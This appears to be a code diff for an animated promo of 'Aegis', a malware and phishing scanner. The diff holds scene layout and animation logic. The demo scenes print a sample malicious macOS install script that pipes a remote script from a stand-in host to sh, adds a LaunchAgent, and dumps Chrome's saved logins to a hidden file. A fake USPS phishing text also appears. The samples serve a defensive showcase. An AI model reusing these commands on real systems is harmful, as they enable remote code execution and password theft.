+      <div id="dlstate" class="pill" style="color:var(--ink-muted);border:1.5px solid var(--border-strong)">Downloading</div>
+    </div>
+    <div style="margin-top:26px;height:10px;border-radius:999px;background:var(--surface-overlay);overflow:hidden"><div id="dlbar" style="height:100%;width:0;background:var(--accent);box-shadow:var(--glow-sm)"></div></div>
+  </div>
+  <div class="abs" style="left:300px;top:640px;width:1320px;height:300px">
+    <div class="abs card" style="left:0;top:40px;width:280px;padding:26px;text-align:center" ${A(42.2)}>${ic('globe', 44, 1.8)}<div style="font:700 26px/1 var(--sans);margin-top:14px">Chrome</div></div>
+    <div id="mem" class="abs card hl" style="left:520px;top:20px;width:280px;padding:30px 26px;text-align:center;color:var(--accent)" ${A(42.6)}>${ic('cpu', 50, 1.8)}<div style="font:700 26px/1 var(--sans);margin-top:14px;color:var(--ink)">Aegis · in memory</div></div>
+    <div class="abs card" style="left:1040px;top:40px;width:280px;padding:26px;text-align:center;color:var(--ink-subtle)" ${A(43.0)}>${ic('folder', 44, 1.8)}<div class="mono" style="font:700 24px/1 var(--mono);margin-top:14px;color:var(--ink-muted)">~/Downloads</div></div>
+    <div id="flow" class="abs" style="left:280px;top:110px;width:240px;height:4px"></div>
+    <div class="abs" style="left:800px;top:110px;width:240px;height:0;border-top:3px dashed rgba(255,107,128,.6)" ${A(43.4, 'fade', .4)}></div>
+    <div class="abs" style="left:885px;top:80px;width:64px;height:64px;border-radius:50%;background:var(--danger-bg);border:2px solid var(--danger);color:var(--danger);display:grid;place-items:center" ${A(43.6, 'pop', .5)}>${ic('lock', 30, 2.4)}</div>
+    <div class="abs mono danger" style="left:790px;top:170px;width:260px;text-align:center;font-size:20px" ${A(43.9)}>not written to disk</div>
+  </div>
+` });
+
+// S7 · two workers
+{
+  const A7 = [[48.5, 'note', 'aegis › sandbox c9de083a created  net=off'], [49.1, 'cmd', '$ sha256sum sample/zoom-update.sh'], [49.7, 'out', '  cfd92c5a…7e629053  matches the download'], [50.4, 'agent', 'droid › review_shell sample/file'], [51.2, 'agent', 'droid › run_sample sh -x zoom-update.sh'], [51.8, 'out', '+ curl -fsSL updates.zoom-support.invalid/…'], [52.3, 'blocked', '  ✕ blocked   network is off'], [52.9, 'out', '+ cat > ~/Library/LaunchAgents/…plist'], [53.4, 'written', '  ✎ wrote     us.zoom.updater.plist'], [54.0, 'out', '+ security find-generic-password …'], [54.7, 'agent', 'droid › persistence + password access'], [55.6, 'verdict', 'verdict › MALICIOUS']];
+  const B7 = [[48.9, 'note', 'chalk › sandbox ready  network=none'], [49.5, 'agent', 'chalk › sha256 cfd9…9053  shell script'], [50.2, 'agent', 'chalk › MalwareBazaar via Chalk SQL'], [50.6, 'out', '  0 known-bad matches  (new sample)'], [51.3, 'agent', 'chalk › read zoom-update.sh'], [52.1, 'out', '  pipes a remote script to sh'], [52.8, 'blocked', '  ✕ blocked   updates.zoom-support.invalid'], [53.7, 'written', '  ✎ LaunchAgent written, starts at login'], [54.6, 'out', '  asks the keychain for Chrome Safe Storage'], [57.4, 'verdict', 'verdict › MALICIOUS']];
+  const col = { note: 'var(--ink-subtle)', cmd: 'var(--ink)', out: 'var(--ink-muted)', agent: 'var(--accent)', blocked: 'var(--danger)', written: 'var(--warning)', verdict: 'var(--danger)' };
+  const lines = arr => arr.map(([t, k, s]) => `<div class="ln" data-in="${t}" data-fx="type" data-d=".35" style="color:${col[k]};${k === 'verdict' ? 'font-weight:800;margin-top:6px' : ''}">${s}</div>`).join('');
+  const panel = (x, id, who, where, name, arr, glowT) => `
+    <div class="panel card" id="${id}" style="left:${x}px" ${A(47.9, 'up', .7)}>
+      <div style="display:flex;align-items:center;justify-content:space-between">
+        <div><div class="label">${who}</div><div class="brandname" data-glow="${glowT}" style="font:800 34px/1 var(--display);margin-top:12px">${name}</div><div class="subtle" style="font:600 20px/1 var(--sans);margin-top:10px">${where}</div></div>
+        <span class="pill off netoff" ${A(48.6, 'pop', .5)}>${ic('wifi-off', 20, 2.4)} Network off</span>
+      </div>
+      <div class="term">${lines(arr)}</div>
+    </div>`;
+  S.push({ id: 's7', s: 46.5, e: 60, html: `
+    <div class="abs" style="left:0;right:0;top:70px;text-align:center">
+      <div class="eyebrow" ${A(46.8)}>Two independent analysts</div>
+      <div class="h2" style="margin-top:20px" ${A(47.0)}>Taken apart in a sandbox. Twice.</div>
+    </div>
+    <div id="chipA" class="file" style="left:820px;top:200px">${ic('file-text', 26)} zoom-update.sh</div>
+    <div id="chipB" class="file" style="left:820px;top:200px">${ic('file-text', 26)} zoom-update.sh</div>
+    ${panel(110, 'pA', 'Worker A', 'Daytona sandbox', 'Factory Droid', A7, 54.3)}
+    ${panel(980, 'pB', 'Worker B', 'Chalk Compute sandbox', 'Chalk', B7, 56.6)}
+  ` });
+}
+
+// S8 · compare
+S.push({ id: 's8', s: 60, e: 67, html: `
+  <div class="abs" style="left:130px;top:150px;width:800px">
+    <div class="eyebrow" ${A(60.2)}>Compare</div>
+    <div class="h1" style="margin-top:24px;font-size:76px" ${A(60.4)}>The more severe<br>answer wins.</div>
+  </div>
+  <div id="cA" class="abs card" style="left:130px;top:520px;width:340px;padding:24px 26px"><div class="label">Factory Droid</div><div style="margin-top:16px">${badge('mal', '', '22px')}</div></div>
+  <div id="cB" class="abs card" style="left:560px;top:520px;width:340px;padding:24px 26px"><div class="label">Chalk</div><div style="margin-top:16px">${badge('mal', '', '22px')}</div></div>
+  <div id="agree" class="abs card hl" style="left:130px;top:500px;width:770px;padding:34px 38px;opacity:0">
+    <div style="display:flex;align-items:center;gap:14px;color:var(--accent);font:700 24px/1 var(--sans)">${ic('check', 26, 3)} Both analysts agree</div>
+    <div style="margin-top:22px">${badge('mal', '', '40px')}</div>
+  </div>
+  <div class="abs" style="left:1180px;top:200px;width:600px;height:700px" ${A(62.2, 'fade', .5)}>
+    <div class="label" style="margin-bottom:20px">AI can only raise a verdict</div>
+    ${[['mal', 'Malicious'], ['sus', 'Suspicious'], ['unk', 'Unknown'], ['cln', 'Clean']].map(([k], i) => `<div class="rung" style="top:${50 + i * 112}px">${badge(k, '', '20px')}</div>`).join('')}
+    <div id="mkRules" class="abs" style="left:380px;top:${50 + 112 + 24}px;font:700 22px/1 var(--sans);color:var(--ink-muted);display:flex;align-items:center;gap:10px;opacity:0">${ic('arrow', 22, 2.4)} rules</div>
+    <div id="mkAI" class="abs" style="left:380px;top:${50 + 24}px;font:800 22px/1 var(--sans);color:var(--accent);display:flex;align-items:center;gap:10px;opacity:0">${ic('arrow-up', 24, 2.6)} AI</div>
+    <div id="liftbar" class="abs" style="left:610px;top:96px;width:6px;height:0;border-radius:3px;background:linear-gradient(0deg,rgba(80,230,255,0),#50e6ff);box-shadow:var(--glow-sm)"></div>
+    <div id="never2" class="abs" style="left:0;top:520px;display:flex;align-items:center;gap:12px;font:700 24px/1 var(--sans);color:var(--ink-subtle);opacity:0"><span style="position:relative">${ic('arrow-down', 26, 2.4)}<span style="position:absolute;left:-4px;top:12px;width:34px;height:3px;background:var(--danger);transform:rotate(-45deg)"></span></span> Never lowered</div>
+  </div>
+` });
+
+// S9 · report
+{
+  const code = [
+    ['#!/bin/sh', 0], ['# zoom.us helper, post-install', 0], ['APP="/Applications/zoom.us.app"', 0],
+    ['curl -fsSL https://cdn-zoom-update.top/s2 | sh', 1],
+    ['cp "$APP/Contents/helper.plist" \\', 2], ['  ~/Library/LaunchAgents/us.zoom.helper.plist', 2], ['launchctl load -w ~/Library/LaunchAgents/…', 2],
+    ['DB=~/Library/Application\\ Support/Google/Chrome', 3], ['sqlite3 "$DB/Default/Login Data" \\', 3], ['  "select * from logins" > /tmp/.zh', 3], ['exit 0', 0]];
+  const T = { 1: 69.6, 2: 70.5, 3: 71.4 };
+  const steps = [['Downloads a second program from', 'cdn-zoom-update.top'], ['Adds itself to your login items', 'us.zoom.helper.plist'], ["Reads Chrome's saved passwords", 'Login Data → /tmp/.zh']];
+  S.push({ id: 's9', s: 67, e: 74.5, html: `
+    <div id="rep" class="abs" style="left:0;top:0;width:1920px;height:1080px">
+      <div class="abs card" style="left:100px;top:110px;width:800px;height:860px;padding:44px 46px" ${A(67.2, 'left', .7)}>
+        <div style="display:flex;align-items:center;gap:18px"><span class="label">Report</span><span class="mono subtle" style="font-size:19px">ZoomUpdate.pkg · 13:58:40</span></div>
+        <div style="margin-top:24px">${badge('mal', '', '24px')}</div>
+        <div style="font:700 40px/1.25 var(--display);margin-top:26px">Installing this adds a hidden login item and copies Chrome's saved passwords.</div>
+        <div class="label" style="margin-top:44px">What would have happened</div>
+        <div style="display:flex;flex-direction:column;gap:26px;margin-top:24px">
+          ${steps.map(([a, b], i) => `<div class="step" ${A(T[i + 1], 'left', .5)}><span class="num">${i + 1}</span><div><div style="font:600 26px/1.3 var(--sans)">${a}</div><div class="mono danger" style="font-size:20px;margin-top:6px">${b}</div></div></div>`).join('')}
+        </div>
+        <div style="display:flex;gap:14px;margin-top:40px" ${A(72.3)}>
+          <span class="pill" style="color:var(--accent);background:var(--accent-soft);border:1.5px solid var(--accent)">${ic('check', 18, 3)} Both analysts agree</span>
+          <span class="pill" style="color:var(--ink-muted);border:1.5px solid var(--border-strong)">${ic('lock', 18, 2.4)} Quarantined</span>
+        </div>
+      </div>
+      <div class="abs card" style="left:960px;top:110px;width:860px;height:860px;padding:36px 0" ${A(67.5, 'right', .7)}>
+        <div style="display:flex;align-items:center;gap:14px;padding:0 36px">${ic('file-text', 26)}<span class="mono" style="font:700 22px/1 var(--mono)">Scripts/postinstall</span><span class="subtle" style="margin-left:auto;font:600 18px/1 var(--sans)">flagged lines in red</span></div>
+        <div class="code" style="margin-top:26px">
+          ${code.map(([l, g], i) => `<div class="cl" ${g ? `data-hl="${T[g]}"` : ''}>${g ? `<span class="hlb"></span>` : ''}<span class="n">${i + 1}</span><span style="position:relative">${l.replace(/</g, '&lt;')}</span>${g && code.findIndex(c => c[1] === g) === i ? `<span class="tag">${g}</span>` : ''}</div>`).join('')}
+        </div>
+      </div>
+    </div>
+  ` });
+}
+
+// S10 · phone
+S.push({ id: 's10', s: 74.5, e: 81, html: `
+  <div class="abs" style="left:150px;top:300px;width:820px">
+    <div class="eyebrow" ${A(74.8)}>On your phone · iMessage</div>
+    <div class="h1" style="margin-top:26px" ${A(75.0)}>Text a screenshot.<br><span class="accent">Get a verdict.</span></div>
+    <div class="lead" style="margin-top:34px" ${A(75.6)}>Links in the picture are judged the same way, without being opened.</div>
+  </div>
+  <div class="phone" ${A(74.6, 'up', .9)}>
+    <div class="abs" style="left:160px;top:16px;width:150px;height:40px;border-radius:20px;background:#000"></div>
+    <div class="abs" style="left:0;right:0;top:80px;text-align:center">
+      <div style="width:76px;height:76px;margin:0 auto;border-radius:50%;background:linear-gradient(180deg,#0f5682,#04111f);display:grid;place-items:center;color:#50e6ff">${ic('shield-check', 40, 1.8)}</div>
+      <div style="font:600 20px/1 -apple-system,var(--sans);margin-top:12px;color:#eef4f8">Aegis</div>
+    </div>
+    <div class="abs" style="left:0;right:0;top:220px;bottom:0;border-top:1px solid #1d2731"></div>
+    <div class="bubble me" style="top:250px;padding:10px;background:#0a84ff" ${A(75.4, 'pop', .5)}>
+      <div style="width:290px;border-radius:18px;background:#f2f2f7;color:#111;padding:18px 18px;font:500 19px/1.35 -apple-system,var(--sans)">
+        <div style="font:700 15px/1 -apple-system,var(--sans);color:#666;margin-bottom:10px">Text Message · 9:12</div>
+        USPS: Your package is on hold. Pay the $1.99 redelivery fee at <span style="color:#0a60d0;text-decoration:underline">usps-redelivery.top/pay</span>
+      </div>
+    </div>
+    <div class="bubble them" id="typing" style="top:520px;padding:18px 22px;opacity:0"><span class="tdot"></span> <span class="tdot"></span> <span class="tdot"></span></div>
+    <div class="bubble them" style="top:520px" ${A(77.3, 'pop', .5)}>
+      <div style="margin-bottom:10px">${badge('mal', '', '15px')}</div>
+      The link goes to <b>usps-redelivery.top</b>, not usps.com. It was registered 3 days ago and asks for card details.
+    </div>
+  </div>
+` });
+
+// S11 · menu bar + overview
+{
+  const tiles = [['Links scanned', 24118, 'globe', 'accent'], ['Links blocked', 212, 'shield-check', 'danger'], ['Files scanned', 1840, 'file-search', 'accent'], ['Files quarantined', 37, 'lock', 'warning']];
+  S.push({ id: 's11', s: 81, e: 87, html: `
+    <div class="menubar" ${A(81.0, 'down', .5)}>
+      <span style="font-weight:800"></span><span style="font-weight:800">Chrome</span><span>File</span><span>Edit</span><span>View</span><span>History</span>
+      <span style="margin-left:auto;color:#50e6ff" id="mbshield">${ic('shield', 20, 2.2)}</span><span>Sun Oct 18</span><span>9:41 AM</span>
+    </div>
+    <div id="dash" class="abs" style="left:80px;top:110px;width:1760px;height:900px">
+      <div class="abs" style="left:0;top:20px" ${A(81.2)}><div class="eyebrow">Overview</div><div class="h2" style="margin-top:16px">What got through today</div></div>
+      <div class="abs card hl" style="left:0;top:180px;width:420px;height:440px;display:grid;place-items:center" ${A(81.5, 'scale', .7)}>
+        <svg width="300" height="300" viewBox="0 0 300 300"><circle cx="150" cy="150" r="125" fill="none" stroke="#0f3a5c" stroke-width="18"/><circle id="ring" cx="150" cy="150" r="125" fill="none" stroke="#50e6ff" stroke-width="18" stroke-linecap="round" transform="rotate(-90 150 150)" style="filter:drop-shadow(0 0 10px rgba(80,230,255,.6))"/></svg>
+        <div class="abs" style="left:0;right:0;top:150px;text-align:center"><div data-count="92" data-in="81.6" data-d="1.6" style="font:800 100px/1 var(--display)">0</div><div class="label" style="margin-top:12px">Coverage</div></div>
+      </div>
+      ${tiles.map(([n, v, icn, c], i) => `<div class="tile card" style="left:${460 + (i % 2) * 450}px;top:${180 + Math.floor(i / 2) * 230}px;width:420px;height:210px" ${A(81.6 + i * .12)}>
+        <div style="display:flex;justify-content:space-between" class="label">${n}<span class="${c}">${ic(icn, 24)}</span></div>
+        <div class="v" data-count="${v}" data-in="${81.7 + i * .12}" data-d="1.8">0</div></div>`).join('')}
+      <div class="abs card" style="left:0;top:660px;width:1360px;height:200px;padding:26px 30px" ${A(82.2)}>
+        <div class="label">Scan log</div>
+        <div class="mono" style="font-size:19px;line-height:1.8;margin-top:14px">
+          <div><span class="subtle">13:58:40</span>  <span class="danger">BLOCK</span>  file zoom-update.sh verdict=malicious workers=2/2</div>
+          <div><span class="subtle">13:47:50</span>  <span class="danger">BLOCK</span>  link login-northwlnd-io.sbs/sso rule=newly-registered+brand-match</div>
+          <div><span class="subtle">13:12:27</span>  <span class="success">ALLOW</span>  link docs.vendor.com/api/auth verdict=clean</div>
+        </div>
+      </div>
+    </div>
+    <div id="mini" class="abs card hl" style="left:1340px;top:52px;width:520px;padding:26px 28px;opacity:0;z-index:4">
+      <div style="display:flex;align-items:center;gap:12px;color:var(--accent)">${ic('shield-check', 28, 2)}<span style="font:800 26px/1 var(--display);color:var(--ink)">Aegis</span><span class="pill" style="margin-left:auto;padding:7px 12px;font-size:13px;color:var(--success);background:var(--success-bg);border:1.5px solid var(--success)">Watching</span></div>
+      <div class="muted" style="font:600 20px/1.4 var(--sans);margin-top:16px">Last hour: 3 held, 0 reached this Mac.</div>
+      <div style="display:flex;flex-direction:column;gap:14px;margin-top:20px">
+        ${[['mal', 'zoom-update.sh'], ['mal', 'login-northwlnd-io.sbs'], ['cln', 'brand-assets.zip']].map(([k, n]) => `<div style="display:flex;align-items:center;gap:14px;padding:12px 14px;border-radius:12px;background:var(--surface-raised)">${badge(k, '', '13px')}<span class="mono" style="font-size:18px">${n}</span></div>`).join('')}
+      </div>
+    </div>
+    <div class="abs" style="left:1480px;top:780px;display:flex;gap:18px;align-items:center" ${A(81.1, 'up', .4, 83.6)}><div id="fnkey" class="keycap">fn</div><div class="muted" style="font:700 22px/1.3 var(--sans)">or ⌃⌥A</div></div>
+    <div class="abs" style="left:1480px;top:690px;width:440px;font:800 46px/1.1 var(--display)" ${A(84.0)}>Always on.<br><span class="muted">Never in the way.</span></div>
+  ` });
+}
+
+// S12 · outro
+S.push({ id: 's12', s: 87, e: 96, html: `
+  <div id="rings2" class="abs" style="left:0;top:0;width:1920px;height:1080px"></div>
+  <div class="abs" style="left:0;right:0;top:260px;height:300px">
+    <div id="s12shield" class="abs" style="left:560px;top:20px;width:260px;height:260px;filter:drop-shadow(0 0 30px rgba(80,230,255,.45))">${shieldSvg('sh2', 260)}</div>
+    <div class="abs" style="left:850px;top:50px;font:800 210px/1 var(--display);letter-spacing:-.04em" ${A(87.6, 'left', .8)}>Aegis</div>
+  </div>
+  <div class="abs" style="left:0;right:0;top:620px;text-align:center;font:700 54px/1 var(--display)" ${A(88.4, 'blur', .9)}>Know before you click.</div>
+  <div class="abs" style="left:0;right:0;top:800px;text-align:center;font:600 24px/1 var(--sans);color:var(--ink-subtle);letter-spacing:.04em" ${A(90.0, 'up', .7)}>Built with <span style="color:var(--ink)">Daytona</span> · <span style="color:var(--ink)">Factory</span> · <span style="color:var(--ink)">Chalk</span> · <span style="color:var(--ink)">Photon</span></div>
+  <div class="abs label" style="left:0;right:0;top:850px;text-align:center" ${A(90.5, 'up', .7)}>HackHarvard 2026</div>
+` });
+
+/* ---------------- engine ---------------- */
+const stage = document.getElementById('stage');
+const host = document.getElementById('scenes');
+host.innerHTML = S.map(s => `<section class="scene" id="${s.id}">${s.html}</section>`).join('');
+S.forEach(s => s.el = document.getElementById(s.id));
+
+const clamp = (x, a = 0, b = 1) => Math.min(b, Math.max(a, x));
+const P = (t, a, b) => clamp((t - a) / (b - a));
+const E = {
+  out: x => 1 - Math.pow(1 - x, 3), in: x => x * x * x,
+  io: x => x < .5 ? 4 * x * x * x : 1 - Math.pow(-2 * x + 2, 3) / 2,
+  back: x => { const c1 = 1.9, c3 = c1 + 1; return 1 + c3 * Math.pow(x - 1, 3) + c1 * Math.pow(x - 1, 2); },
+  expo: x => x === 1 ? 1 : 1 - Math.pow(2, -10 * x),
+};
+const lerp = (a, b, k) => a + (b - a) * k;
+function tf(el, { o = 1, x = 0, y = 0, s = 1, r = 0, b = 0 }) {
+  el.style.opacity = o;
+  el.style.transform = `translate(${x}px,${y}px) scale(${s}) rotate(${r}deg)`;
+  el.style.filter = b > 0.05 ? `blur(${b}px)` : '';
+}
+// keyframed path: [[t, x, y], ...] with ease between keys
+function path(t, keys) {
+  if (t <= keys[0][0]) return keys[0].slice(1);
+  for (let i = 1; i < keys.length; i++) if (t <= keys[i][0]) {
+    const k = E.io(P(t, keys[i - 1][0], keys[i][0]));
+    return [lerp(keys[i - 1][1], keys[i][1], k), lerp(keys[i - 1][2], keys[i][2], k)];
+  }
+  return keys[keys.length - 1].slice(1);
+}
+
+// generic entrances
+const ENT = [...document.querySelectorAll('[data-in]')].map(el => {
+  const o = { el, t: +el.dataset.in, d: +(el.dataset.d || .6), fx: el.dataset.fx || 'up', out: el.dataset.out != null ? +el.dataset.out : null };
+  if (o.fx === 'type' || el.dataset.type) { o.text = el.textContent; o.cps = +(el.dataset.type || 0); }
+  return o;
+});
+function entrances(t) {
+  for (const o of ENT) {
+    if (o.cps) { // typewriter
+      const n = Math.floor(clamp((t - o.t) * o.cps, 0, o.text.length));
+      const typing = t >= o.t && n < o.text.length;
+      o.el.innerHTML = o.text.slice(0, n).replace(/</g, '&lt;') + (typing || (t >= o.t && t < o.t + o.text.length / o.cps + 1.2 && Math.floor(t * 2.5) % 2 === 0) ? '<span class="caret"></span>' : '');
+      continue;
+    }
+    if (o.fx === 'type') { // terminal line: reveal characters quickly
+      const k = P(t, o.t, o.t + o.d);
+      const n = Math.floor(o.text.length * k);
+      o.el.textContent = k <= 0 ? '' : o.text.slice(0, n);
+      o.el.style.opacity = k > 0 ? 1 : 0;
+      continue;
+    }
+    let k = P(t, o.t, o.t + o.d);
+    let ko = o.out != null ? P(t, o.out, o.out + .4) : 0;
+    const e = o.fx === 'pop' ? E.back(k) : E.out(k);
+    const st = { o: clamp(E.out(k) * 1.2) * (1 - ko) };
+    if (o.fx === 'up') st.y = 40 * (1 - e);
+    if (o.fx === 'down') st.y = -40 * (1 - e);
+    if (o.fx === 'left') st.x = -60 * (1 - e);
+    if (o.fx === 'right') st.x = 80 * (1 - e);
+    if (o.fx === 'scale') { st.s = .9 + .1 * e; st.b = 10 * (1 - k); }
+    if (o.fx === 'pop') { st.s = .4 + .6 * e; }
+    if (o.fx === 'blur') { st.b = 24 * (1 - E.out(k)); st.s = 1.08 - .08 * E.out(k); st.y = 0; }
+    if (ko) st.y = (st.y || 0) - 20 * ko;
+    tf(o.el, st);
+  }
+}
+// counters
+const CNT = [...document.querySelectorAll('[data-count]')];
+function counters(t) {
+  for (const el of CNT) {
+    const k = E.expo(P(t, +el.dataset.in, +el.dataset.in + +el.dataset.d));
+    el.textContent = Math.round(+el.dataset.count * k).toLocaleString('en-US');
+  }
+}
+// drawn shield paths
+function prepShield(id) {
+  const svg = document.getElementById(id);
+  const line = svg.querySelector('.sline'), chk = svg.querySelector('.scheck');
+  const L1 = line.getTotalLength(), L2 = chk.getTotalLength();
+  line.style.strokeDasharray = L1; chk.style.strokeDasharray = L2;
+  return { svg, line, chk, fill: svg.querySelector('.sfill'), L1, L2 };
+}
+const SH1 = prepShield('sh1'), SH2 = prepShield('sh2');
+function drawShield(sh, t, a) {
+  sh.line.style.strokeDashoffset = sh.L1 * (1 - E.io(P(t, a, a + 1.1)));
+  sh.fill.setAttribute('opacity', E.out(P(t, a + .9, a + 1.5)));
+  sh.chk.style.strokeDashoffset = sh.L2 * (1 - E.out(P(t, a + 1.3, a + 1.8)));
+}
+// expanding rings
+function rings(el, t, start, end, cx, cy, every = 1.1, color = '80,230,255') {
+  let h = '';
+  if (t >= start) for (let k = 0; k < 6; k++) {
+    const born = start + k * every;
+    const age = t - born;
+    if (age < 0 || born > end) continue;
+    const life = age % (every * 6);
+    const r = 120 + life * 330, a = Math.max(0, .45 - life * .14);
+    if (a <= 0) continue;
+    h += `<div style="position:absolute;left:${cx - r}px;top:${cy - r}px;width:${2 * r}px;height:${2 * r}px;border-radius:50%;border:2px solid rgba(${color},${a})"></div>`;
+  }
+  el.innerHTML = h;
+}
+
+const $ = id => document.getElementById(id);
+const sweep = $('sweep'), flash = $('flash'), black = $('black');
+const BOUNDS = [8, 15.5, 22, 28, 41, 46.5, 60, 67, 74.5, 81, 87];
+
+/* background */
+const bg = $('bg'), g = bg.getContext('2d');
+let seed = 7; const rnd = () => (seed = (seed * 16807) % 2147483647) / 2147483647;
+const PARTS = Array.from({ length: 150 }, () => ({ x: rnd() * 1920, y: rnd() * 1080, z: .3 + rnd() * .9, ph: rnd() * 6.28 }));
+function drawBg(t) {
+  const red = clamp(P(t, 8.2, 9.2) - P(t, 14.8, 15.8));
+  const grd = g.createRadialGradient(960, 420, 50, 960, 540, 1250);
+  grd.addColorStop(0, `rgb(${lerp(10, 40, red)},${lerp(42, 16, red)},${lerp(67, 32, red)})`);
+  grd.addColorStop(.55, '#05192c'); grd.addColorStop(1, '#020a14');
+  g.fillStyle = grd; g.fillRect(0, 0, 1920, 1080);
+  // perspective grid floor
+  const hz = 660, col = red > .5 ? '255,107,128' : '80,230,255';
+  g.lineWidth = 1;
+  for (let i = 0; i < 18; i++) {
+    const z = ((i + (t * .35) % 1) / 18);
+    const y = hz + Math.pow(z, 2.2) * 520;
+    g.strokeStyle = `rgba(${col},${Math.pow(z, 1.5) * .14})`;
+    g.beginPath(); g.moveTo(0, y); g.lineTo(1920, y); g.stroke();
+  }
+  const vg = g.createLinearGradient(0, hz, 0, 1080);
+  vg.addColorStop(0, `rgba(${col},0)`); vg.addColorStop(1, `rgba(${col},.12)`);
+  g.strokeStyle = vg;
+  for (let i = -16; i <= 16; i++) { g.beginPath(); g.moveTo(960 + i * 30, hz); g.lineTo(960 + i * 260, 1080); g.stroke(); }
+  // particles
+  for (const p of PARTS) {
+    const y = ((p.y - t * 18 * p.z) % 1080 + 1080) % 1080;
+    const x = p.x + Math.sin(t * .3 + p.ph) * 20 * p.z;
+    const a = (.25 + .35 * Math.sin(t * 1.3 + p.ph * 3)) * p.z;
+    g.fillStyle = `rgba(${red > .5 ? '255,150,165' : '139,240,255'},${Math.max(0, a)})`;
+    g.beginPath(); g.arc(x, y, 1.1 + p.z * 1.4, 0, 6.283); g.fill();
+  }
+}
+
+/* scene-specific dynamics */
+function scenes(t) {
+  // S1 rows drift, accelerate before exit
+  if (t < 9) {
+    const acc = Math.pow(P(t, 6.2, 8), 2) * 900;
+    document.querySelectorAll('#s1rows .row').forEach(r => {
+      const i = +r.dataset.row, dir = i % 2 ? 1 : -1, sp = 30 + (i * 37) % 50;
+      r.style.transform = `translateX(${-400 + dir * (t * sp + acc * (1 + i % 3))}px)`;
+      r.style.opacity = (.16 + ((i * 13) % 7) / 30) * (1 - .6 * P(t, .8, 2)) ;
+    });
+  }
+  // S2 falling files, alerts
+  if (t > 7.5 && t < 16) {
+    const f1 = $('f1'), f2 = $('f2');
+    const k1 = E.in(P(t, 9.0, 9.8)), k2 = E.in(P(t, 11.8, 12.6));
+    tf(f1, { o: P(t, 8.8, 9.0) * (1 - P(t, 9.75, 9.85)), y: lerp(-80, 470, k1), r: lerp(-8, 4, k1) });
+    tf(f2, { o: P(t, 11.6, 11.8) * (1 - P(t, 12.55, 12.65)), y: lerp(-80, 470, k2), r: lerp(6, -3, k2) });
+    $('lapflash').style.opacity = Math.max(0, 1 - Math.abs(t - 9.9) * 2.5);
+    const al = P(t, 9.9, 10.2) * (1 - P(t, 11.4, 11.7));
+    const gl = t > 9.9 && t < 10.5 ? Math.sin(t * 90) * 8 : 0;
+    tf($('lapalert'), { o: al, x: gl, s: .9 + .1 * E.back(P(t, 9.9, 10.3)) });
+    tf($('lapok'), { o: P(t, 12.7, 13.0), s: .9 + .1 * E.out(P(t, 12.7, 13.0)) });
+    tf($('bug'), { o: P(t, 13.1, 13.5), x: Math.sin(t * 3) * 14, y: -P(t, 13.1, 15) * 40, r: Math.sin(t * 7) * 10 });
+    $('laptop').style.filter = t > 14.4 ? `grayscale(${P(t, 14.4, 15.2)})` : '';
+  }
+  // S3 shield + wordmark
+  if (t > 15 && t < 23) {
+    drawShield(SH1, t, 15.6);
+    const m = E.io(P(t, 16.9, 17.7));
+    tf($('s3shield'), { x: lerp(0, -380, m), s: lerp(1.25, .95, m), o: P(t, 15.5, 15.7) });
+    document.querySelectorAll('#word .wl').forEach(l => {
+      const i = +l.dataset.i, k = E.out(P(t, 17.1 + i * .07, 17.7 + i * .07));
+      tf(l, { o: k, y: 60 * (1 - k), b: 14 * (1 - k) });
+      const sh = Math.exp(-Math.pow((P(t, 17.9, 19.0) * 8 - 1.5) - i, 2) / 1.2) * (t > 17.9 && t < 19.2 ? 1 : 0);
+      l.style.color = sh > .02 ? `color-mix(in srgb, #8bf0ff ${sh * 100}%, #e6f3fb)` : '';
+      l.style.textShadow = sh > .02 ? `0 0 ${40 * sh}px rgba(80,230,255,${.8 * sh})` : '';
+    });
+    $('word').style.transform = `translateX(-${lerp(0, 80, m)}px)`;
+    rings($('rings'), t, 16.8, 21, 960 - 380 * m, 480, 1.1);
+    flash.style.opacity = Math.max(0, .9 - Math.abs(t - 16.75) * 3);
+  }
+  // S4 shockwaves
+  if (t > 21.5 && t < 28.5) {
+    document.querySelectorAll('#s4 .shock').forEach(s => {
+      const a = t - +s.dataset.t, c = { mal: '255,107,128', sus: '255,181,71', unk: '124,183,255', cln: '47,224,181' }[s.dataset.k];
+      if (a < 0 || a > 1) { s.innerHTML = ''; return; }
+      const r = 30 + E.out(a) * 220, al = .8 * (1 - a);
+      s.innerHTML = `<div style="position:absolute;left:${-r}px;top:${-r}px;width:${2 * r}px;height:${2 * r}px;border-radius:50%;border:3px solid rgba(${c},${al});box-shadow:0 0 30px rgba(${c},${al * .6})"></div>`;
+    });
+  }
+  // S5 link → cursor → guard
+  if (t > 27.5 && t < 41.5) {
+    const bl = $('badlink'), on = P(t, 29.2, 29.6);
+    bl.style.outline = on ? `3px solid rgba(255,107,128,${on})` : 'none';
+    bl.style.background = `rgba(255,107,128,${.12 * on})`;
+    bl.style.color = on > .5 ? '#ffb3bf' : '#7cb7ff';
+    tf($('linktag'), { o: P(t, 29.5, 29.8) * (1 - P(t, 30.5, 30.7)), y: -10 * (1 - E.back(P(t, 29.5, 29.9))) - 20, s: .7 + .3 * E.back(P(t, 29.5, 29.9)) });
+    const [cx, cy] = path(t, [[29.6, 1000, 700], [30.3, 324, 382], [38.8, 324, 382], [39.6, 304, 530], [41, 304, 530]]);
+    tf($('cur5'), { o: P(t, 29.6, 29.9), x: cx, y: cy, s: (Math.abs(t - 30.4) < .08 || Math.abs(t - 39.75) < .08) ? .85 : 1 });
+    const rp = (el, at, x, y) => { const a = P(t, at, at + .5); el.style.left = x + 'px'; el.style.top = y + 'px'; tf(el, { o: a > 0 && a < 1 ? 1 - a : 0, s: .3 + E.out(a) }); };
+    rp($('ripple5'), 30.4, 330, 386); rp($('ripple5b'), 39.75, 310, 536);
+    const gIn = E.out(P(t, 30.55, 31.0)), gOut = P(t, 39.85, 40.2);
+    $('scrim').style.opacity = gIn * (1 - gOut);
+    tf($('guard'), { o: gIn * (1 - gOut), s: (.92 + .08 * E.back(P(t, 30.55, 31.0))) * (1 - .05 * gOut), y: 20 * gOut });
+    $('backbtn').style.boxShadow = t > 38.9 && t < 39.9 ? '0 0 0 6px rgba(80,230,255,.35), 0 0 30px rgba(80,230,255,.6)' : '';
+    tf($('never'), { o: P(t, 40.1, 40.4), s: .8 + .2 * E.back(P(t, 40.1, 40.5)) });
+    $('linktag').style.zIndex = 1;
+  }
+  // S6 download bar + flow
+  if (t > 40.5 && t < 47) {
+    const k = P(t, 41.4, 42.4) * .64;
+    $('dlbar').style.width = (k * 100) + '%';
+    const held = t > 42.4;
